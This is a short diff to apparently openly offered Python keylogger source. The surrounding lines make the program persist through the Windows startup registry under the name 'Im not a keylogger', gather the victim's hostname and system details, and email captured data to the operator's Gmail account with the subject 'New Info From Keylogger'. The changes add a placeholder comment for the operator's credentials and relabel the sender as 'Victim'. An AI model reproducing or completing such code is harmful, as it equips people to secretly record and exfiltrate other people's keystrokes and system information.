@@ -18,6 +18,7 @@ def addStartup():  # this will add the file to the startup registry key
     SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
                new_file_path)
 addStartup()
+## CHANGE THIS ##
 sender = 'your_email@gmail.com'
 reciever = 'your_email@gmail.com'
 password = 'your_password'
@@ -76,7 +77,7 @@ System OS: %s
 Release: %s
 Version: %s
         """ % (socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version()) ###########
-        part1 = """From: Filip <toxicnull@gmail.com>
+        part1 = """From: Victim <toxicnull@gmail.com>
 To: Filip <toxicnull@gmail.com>
 Subject: New Info From Keylogger
 MIME-Version: 1.0
